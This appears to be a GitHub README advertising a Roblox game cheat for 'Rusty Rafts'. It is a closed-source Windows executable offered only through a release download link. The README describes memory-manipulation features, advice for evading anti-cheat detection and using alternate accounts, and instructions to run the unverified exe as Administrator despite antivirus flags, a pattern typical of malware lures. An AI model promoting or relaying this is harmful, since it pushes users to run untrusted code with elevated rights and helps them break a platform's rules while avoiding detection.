⚠️ **DISCLAIMER — CRITICAL NOTICE**  
This software is provided for **educational and research purposes only**. The user assumes all liability for any misuse, violation of Roblox Terms of Service, or account sanctions resulting from the use of this tool. No guarantee of account safety or detection avoidance is expressed or implied. Use at your own risk.

---

<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=7&height=220&section=header&text=Rusty+Rafts+Roblox+Script+2026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Survival+Exploit+Utility+Tool&descAlignY=56&descSize=20" width="100%"/>

# Rusty Rafts Roblox Script 2026 🌲🔥

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/CobblerLocate/rusty-rafts-roblox-utility?style=for-the-badge&logo=github)
![Forks](https://img.shields.io/github/forks/CobblerLocate/rusty-rafts-roblox-utility?style=for-the-badge&logo=github)
![Last Commit](https://img.shields.io/github/last-commit/CobblerLocate/rusty-rafts-roblox-utility?style=for-the-badge)
![Repo Size](https://img.shields.io/github/repo-size/CobblerLocate/rusty-rafts-roblox-utility?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/CobblerLocate/rusty-rafts-roblox-utility/releases/download/v4.7.14/rusty-rafts-roblox-utility-v4.7.14.zip">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20Rusty%20Rafts%20Roblox%20Script%202026-4a7c3f?style=for-the-badge&logoColor=white&labelColor=2d4f27" width="420" alt="Download Rusty Rafts Roblox Script 2026"/>
  </a>
</p>

</div>

---

## ❓ FAQ

**Q1: What is the detection risk for this script in 2026?**  
The risk of account sanctions is **non-zero** but reduced with reasonable use. This script operates via external memory manipulation and does not inject Lua code into the Roblox client directly. Relying on this tool during heavily moderated events (e.g., official tournaments) is not advised. Use alternate accounts for testing.

**Q2: How often is this script updated?**  
The update cadence is event-driven. Patches are released within 24–48 hours of a confirmed Roblox client update that breaks functionality. All releases are published to the [Releases](../../releases/latest) page. Check the `Last Commit` badge for recency.

**Q3: I get a "DLL missing" or "Runtime error" when launching the executable. What do I do?**  
Ensure you have the following installed:  
- Microsoft Visual C++ Redistributable 2015–2022 (x64)  
- .NET Framework 4.8 or later  
- DirectX End-User Runtimes (June 2010)  
Run the executable as Administrator. If the issue persists, re-download the package from the latest release — corrupted downloads sometimes occur.

---

## 📋 Table of Contents

- [📖 About](#-about)
- [⚙️ Requirements](#-requirements)
- [✨ Features](#-features)
- [🛡️ Safety](#-safety)
- [🎮 How to Use](#-how-to-use)
- [📦 Installation](#-installation)
- [📊 Compatibility](#-compatibility)
- [💬 Community & Support](#-community--support)
- [📜 License](#-license)
- [⚠️ Disclaimer](#-disclaimer)

---

## 📖 About

Rusty Rafts Roblox Script is a **standalone Windows utility** engineered for the Roblox survival game *Rusty Rafts*. It provides external access to game-state manipulation, resource modification, and client-side visual aids commonly classified as a game cheat/tool. The project is distributed exclusively as a pre-compiled executable (.exe) via the GitHub Releases page. No source code, build scripts, or Python dependencies are provided. This tool is maintained for educational study of client-server trust models.

---

## ⚙️ Requirements

- **Operating System:** Windows 10 (build 1909+), Windows 11
- **Runtime:** .NET Framework 4.8 / .NET Desktop Runtime 6.0+
- **Disk Space:** 15 MB free
- **Internet:** Required for initial feature validation and automatic update checks
- **User Permissions:** Administrator privileges for memory read/write
- **Target Application:** Roblox Player (UWP or Win32 version) installed and logged in

---

## ✨ Features

**Resource Modifier 🔧** — Adjust hunger, thirst, health, and oxygen values. All modifications are client-side; server reconciliation may reset values under certain conditions.

**Item Spawner 📦** — Spawn any in-game item directly into your inventory or at your character's feet. Requires item ID lookup (included in the utility's database).

**No Clip Mode 🧱** — Enable phased movement through terrain and structures. Disabled automatically upon teleport to prevent geometry corruption.

**Fast Crafting ⏳** — Bypass the default animation timer for crafting stations. Reduces craft time to 0.1 seconds per item.

**Fullbright Mode 💡** — Override the game's ambient lighting to maximum brightness. Disables dynamic shadow rendering.

**Teleport System 🗺️** — Save and load coordinate waypoints. Supports one-click teleport to predefined locations (islands, resources, spawn points).

**Auto-Fish 🎣** — Automatic casting, reeling, and loot collection when a fishing rod is equipped. Configurable delay and cast range.

**UI Overlay 📊** — Real-time radar showing player positions, shark proximity, and nearby resource spawns. Overlay is hardware-rendered and does not hook into Roblox's UI system.

---

## 🛡️ Safety

This tool operates through **external process memory manipulation** (WriteProcessMemory / ReadProcessMemory). It does not inject DLLs, modify game files, or interfere with Roblox's anti-tamper systems at the kernel level. Detection vectors include:
- Suspicious memory access patterns (Byfron/Hyperion behavioral monitoring)
- Replicated client-side value changes (server-side validation triggers)
- Frequent account login/logout cycles

To minimize risk:
- Do not modify values in plain view of other players.
- Avoid spawning items at public spawn points.
- Limit session duration to under 4 hours per run.
- Use an alternate Roblox account for testing.

---

## 🎮 How to Use

1. Launch Roblox and join a *Rusty Rafts* server.
2. Run the executable as Administrator.
3. The overlay will appear in the top-left corner. Press `INSERT` to toggle visibility.
4. Navigate features using the menu (default hotkey: `F1`).

**Hotkey Reference:**

| Action               | Key       |
|----------------------|-----------|
| Toggle Overlay       | INSERT    |
| Open Feature Menu    | F1        |
| Teleport to Waypoint | F2        |
| Toggle No Clip       | F3        |
| Toggle Fullbright    | F4        |
| Quick Refresh Items  | F5        |

---

## 📦 Installation

1. Go to the [Releases](../../releases/latest) page and download the latest version.
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

*Do not rename the executable or move it to system-protected directories.*

---

## 📊 Compatibility

| OS                | Version        | Status | Notes                                                    |
|-------------------|----------------|--------|----------------------------------------------------------|
| Windows 10        | 1909 – 22H2    | ✅     | Fully compatible.                                        |
| Windows 11        | 21H2 – 23H2    | ✅     | Fully compatible. Some antivirus may flag the executable.|
| Windows 10        | 1507 – 1809    | ⚠️     | Runtime library may require manual installation.        |
| Windows 7         | SP1            | ❌     | Unsupported. Missing required .NET overlays.             |

---

##